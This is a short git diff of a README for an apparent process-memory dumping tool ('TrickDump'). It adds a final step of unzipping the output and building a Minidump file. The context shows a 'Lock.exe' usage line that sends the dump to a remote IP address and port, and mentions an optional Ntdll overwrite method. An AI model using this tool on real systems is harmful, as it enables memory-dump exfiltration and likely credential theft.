@@ -81,6 +81,7 @@ If you prefer to execute only one binary, Trick.exe generates a ZIP file contain
 ```
 Lock.exe [disk/knowndlls/debugproc] [IP_ADDRESS] [PORT]
 ```
+
 You can create the ZIP file locally, optionally using a Ntdll overwrite method:
 
 ![img5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_5.png)
@@ -88,3 +89,7 @@ You can create the ZIP file locally, optionally using a Ntdll overwrite method:
 Or send it to a remote port using the second and third parameter as the IP address and the port:
 
 ![img6](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_6.png)
+
+In both cases you get a ZIP file like this, unzip it and create the Minidump file:
+
+![img7](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_7.png)
